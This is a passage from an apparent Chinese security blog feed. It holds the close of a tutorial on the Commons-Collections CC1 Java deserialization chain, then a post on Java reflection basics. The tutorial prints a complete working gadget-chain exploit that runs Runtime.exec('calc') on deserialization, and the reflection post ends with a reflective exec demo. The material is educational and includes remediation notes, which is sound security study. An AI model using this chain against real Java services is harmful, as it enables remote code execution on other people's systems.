src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329586.png" alt="image-20240823211902162"></p><p>这里调用了<code>entrySet</code>方法，也就是说，如果我们将<code>memberValues</code>的值改为代理对象，当调用代理对象的方法，就会跳到执行<code>invoke</code>方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329510.png" alt="image-20240823213000546"></p><p><code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>，可以使用动态代理</p><p>我们将<code>AnnotationInvocationHandler</code>对象用Proxy进行动态代理，那么进行<code>readObject</code>时，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler.invoke</code>方法中，进而触发<code>LazyMap.get</code>方法</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class LazyExpFinal &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class), //构造setValue的可控参数                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);        //设置动态代理        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Map.class&#125;, invocationHandler);        //触发invoke        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);        serialize(invocationHandler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329561.png" alt="image-20240823220642200"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p><strong>利用链</strong></p><pre><code>利用链：InvokerTransformer#transformLazyMap#getAnnotationInvocationHandler#readObject工具类辅助利用链：ChainedTransformerConstantTransformerHashMapMap(Proxy)#entrySet</code></pre><p><strong>流程图</strong></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329295.png" alt="image-20240823222404367"></p><h1 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h1><p>官方推荐的修复方法是将jdk版本提升至jdk8u71</p><h2 id="TransformMap"><a href="#TransformMap" class="headerlink" title="TransformMap"></a>TransformMap</h2><p>jdk8u71及后续版本没有能调用<code>readObject</code>中<code>setValue</code>方法的地方</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>jdk8u67之后的版本序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code>来获取几个特定的属性，<code>defaultReadObject</code>可以恢复对象本身的属性，比如<code>this.memberValues</code>就能恢复成我们原本设计的恶意类，但是通过<code>readFields</code>方式，<code>this.memberValues</code>为null，后面执行<code>get</code>方法就没办法触发，这也就是高版本不能使用的原因</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[Java反序列化Commons-Collections篇01-CC1链][<a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/]">https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/]</a></p><p>[Java_Commons-Collections 1 (CC1) 学习过程][<a href="https://blog.nbcares.top/archives/CC1]">https://blog.nbcares.top/archives/CC1]</a></p><p>[CommonCollections1利用链分析][<a href="https://gtl-ju.github.io/2023/07/18/CommonCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/]">https://gtl-ju.github.io/2023/07/18/CommonCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;[JDK8u65][&lt;a href=&quot;https://www.oracle.com/java/technolog</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-反射</title>
    <link href="http://example.com/2024/07/26/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/"/>
    <id>http://example.com/2024/07/26/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84/</id>
    <published>2024-07-26T06:25:49.000Z</published>
    <updated>2024-07-26T06:45:41.713Z</updated>
    
    <content type="html"><![CDATA[<p>Java安全可以从反序列化说起，而反序列化可以从反射说起。</p><p><strong>Java反射机制</strong>：对于任意一个类都能知道这个类的所有属性和方法，对于任意一个对象，都能调用它的任意方法。这种动态获取信息以及动态调用方法的功能称为反射机制。</p><p><strong>反射的作用</strong>：让Java具有动态性</p><h1 id="正射与反射"><a href="#正射与反射" class="headerlink" title="正射与反射"></a>正射与反射</h1><h2 id="正射"><a href="#正射" class="headerlink" title="正射"></a>正射</h2><p>我们需要用到某个类的时候，都会先了解这个类是作什么的，然后实例化这个类，接着用实例化后的对象进行操作，这就是正射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Student st= <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">st.dohomework();</span><br></pre></td></tr></table></figure><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>而反射就是，一开始并不知道我们要初始化的对象是什么，自然也就无法使用new关键字来创建对象了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br></pre></td></tr></table></figure><p>理解反射的第一步就是要搞清楚Class是什么</p><h1 id="Java-Class对象"><a href="#Java-Class对象" class="headerlink" title="Java Class对象"></a>Java Class对象</h1><p>Class类全称java.lang.Class类。</p><p>Java是面向对象的语言，讲究万物皆对象，即使再强大的一个类，依然是另一个类(Class类)的对象。也就是说，普通类是Class类的对象，Class类是所有类的类。</p><p>程序在运行的时候会编译生成一个.class文件，而这个.class为文件中的内容就是相对应类的所有信息。</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">abc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> t.getClass();</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407252123591.png" alt="img"></p><p>Class类的对象作用是运行时提供或获得某个对象的类型信息。</p><h1 id="反射组成相关的类"><a href="#反射组成相关的类" class="headerlink" title="反射组成相关的类"></a>反射组成相关的类</h1><p>反射机制相关操作一般位于java.lang.reflect包中</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407252128476.png" alt="img"></p><p>重点注意以下类：</p><ul><li>java.lang.class：类对象</li><li>java.lang.reflect.Constructor：类的构造器对象</li><li>java.lang.reflect.Field：类的属性对象</li><li>java.lang.reflect.Method：类的方法对象</li></ul><h1 id="反射常用方法"><a href="#反射常用方法" class="headerlink" title="反射常用方法"></a>反射常用方法</h1><ul><li>获取类的方法：forName</li><li>实例化类对象的方法：newInstance</li><li>获取函数的方法：getMethod</li><li>执行函数的方法：invoke</li></ul><h2 id="class对象的获取方法"><a href="#class对象的获取方法" class="headerlink" title="class对象的获取方法"></a>class对象的获取方法</h2><p>理解Java反射机制首先要理解Class类，而在反射中想要获取一个类或调用一个类的方法，首先需要获取到该类的Class对象</p><p>普通类采用以下方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br></pre></td></tr></table></figure><p>创建Class类时不能使用上述方法，会报错</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407252138950.png" alt="QQ截图20240712184804"></p><p>跟进源码看看，发现构造器是私有的，只有JVM才能创建对象，所以无法通过创建对象的方式来获取class对象</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407252140446.png" alt="QQ截图20240712184908"></p><p>一般获取class对象有以下三种方法：</p><ul><li><strong>实例化对象的getClass方法</strong></li></ul><p>存在某个类的实例，通过obj.getClass获取它的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br></pre></td></tr></table></figure><ul><li><strong>使用类的.class方法</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Person.class;</span><br></pre></td></tr></table></figure><ul><li><strong>Class.forName(String className)动态加载类</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;serialize.Person&quot;</span>);</span><br></pre></td></tr></table></figure><p>下面来看一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Class c1=Person.class;</span><br><span class="line">System.out.println(c1);</span><br><span class="line"><span class="comment">//类.class</span></span><br><span class="line"></span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">Class c2=person.getClass();</span><br><span class="line">System.out.println(c2);</span><br><span class="line"><span class="comment">//实例化对象的getClass</span></span><br><span class="line"></span><br><span class="line">Class c3=Class.forName(<span class="string">&quot;serialize.Person&quot;</span>);</span><br><span class="line">System.out.println(c3);</span><br><span class="line"><span class="comment">//Class.forName(String classname)动态加载类</span></span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261141710.png" alt="img"></p><p>上面三种获取Class类的方式中，一般使用第三种通过Class.forName方式动态加载类，这种方式不需要再导入其他类，可以加载任意的类</p><p>使用类.class，需要导入类的包，依赖性太强</p><p>使用实例化对象的getClass方法，需要本身就创建一个对象，这样就失去了使用反射机制的意义</p><p>所以获取class对象，一般使用Class.forName方法获取</p><h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><p>获取成员变量Field位于java.lang.reflect.Field包中</p><ul><li>Field[] getFields()：获取所有public修饰的成员变量</li><li>Field[] getDeclaredFields()：获取所有的成员变量，不包括修饰符</li><li>Field getField(String name)：获取指定名称的public修饰的成员变量</li><li>Field getDeclaredField(String name)：获取指定的成员变量</li></ul><h2 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h2><ul><li>Method getMethod(String name,类&lt;?&gt;…parameterTypes)：返回该类声明的public方法</li><li>Method getDeclaredMethod(String name,类&lt;?&gt;…parameterTypes)：返回该类声明的所有方法</li></ul><p>第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</p><ul><li>Method[] getMethods()：获取所有public方法，包括类自身声明的public方法，父类public方法，实现的接口方法</li><li>Method[] getDeclaredMethods()：获取该类中所有方法</li></ul><p>Person.java添加以下内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学习中...&quot;</span>+s);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;睡眠中...&quot;</span>+age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>abc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">abc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;serialize.Person&quot;</span>);</span><br><span class="line">        Method[] method1 = c.getMethods();<span class="comment">//所有public方法，包括类自身声明的public方法，父类public方法，实现的接口方法</span></span><br><span class="line">        Method[] method2 = c.getDeclaredMethods();<span class="comment">//获取该类中的所有方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;以下是该类中的所有public方法&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Method m:method1)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;以下是所有方法&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Method m:method2)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;以下是public的study方法&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;study&quot;</span>, String.class);<span class="comment">//获取public的study方法</span></span><br><span class="line">        System.out.println(method3);</span><br><span class="line">        System.out.println(<span class="string">&quot;以下是pricate的sleep方法&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method4</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;sleep&quot;</span>, <span class="type">int</span>.class);<span class="comment">//获取pricate的sleep方法</span></span><br><span class="line">        System.out.println(method4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261435962.png" alt="img"></p><h2 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h2><ul><li>Constructor&lt;?&gt;[] getConstructors()：只返回public构造函数</li><li>Constructor&lt;?&gt;[] getDeclaredConstructors()：返回所有构造函数</li><li>Constructor&lt;&gt; getConstructor(类&lt;?&gt;…parameterTypes)：匹配和参数配型相符的public构造函数</li><li>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;…parameterTypes)：匹配和参数配型相符的构造函数</li></ul><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无参构造</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私有构造函数</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>abc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">abc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;serialize.Person&quot;</span>);</span><br><span class="line">        Constructor[] constructor1= c.getDeclaredConstructors();</span><br><span class="line">        Constructor[] constructor2= c.getConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;所有构造函数&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Constructor con:constructor1)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;所有public构造函数&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Constructor con:constructor2)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;public构造函数&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor3</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        System.out.println(constructor3);</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor4</span> <span class="operator">=</span> c.getDeclaredConstructor(String.class);</span><br><span class="line">        System.out.println(constructor4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261443022.png" alt="img"></p><h2 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h2><p>通过反射来生成实例对象，一般使用Class对象的newInstance()方法来创建类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;serialize.Person&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance();</span><br></pre></td></tr></table></figure><p>invoke方法，位于java.lang.reflect.Method类中，用于执行某个对象的目标方法，一般和getMethod方法配合使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,Object... args)</span></span><br></pre></td></tr></table></figure><p>第一个参数为类的实例，第二个参数为相应函数中的参数</p><ul><li>obj：从中调用底层方法的对象，必须是实例化对象</li><li>args：用于方法的调用，是一个object的数组，参数可能是多个</li></ul><p>但是第一个参数不固定，<strong>如果调用的方法是普通方法，那么第一个参数就是类对象，如果是静态方法，那么第一个参数就是类</strong></p><p>写个小demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">abc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;reflect&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;serialize.abc&quot;</span>);<span class="comment">//创建class对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance();<span class="comment">//创建类实例对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflect&quot;</span>);<span class="comment">//获取reflect方法</span></span><br><span class="line">            m.invoke(o);<span class="comment">//调用类实例对象方法</span></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261405669.png" alt="img"></p><h1 id="反射构造Runtime类执行"><a href="#反射构造Runtime类执行" class="headerlink" title="反射构造Runtime类执行"></a>反射构造Runtime类执行</h1><p>直接使用上面的demo会报错</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261408566.png" alt="img"></p><p>这是因为Runtime类的构造方法是私有的</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261409960.png" alt="img"></p><p>但是可以通过getRuntime来获取Runtime对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">abc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;reflect&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m1.invoke(c);</span><br><span class="line">            m.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261416398.png" alt="img"></p><p>也可以简化一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407261418703.png" 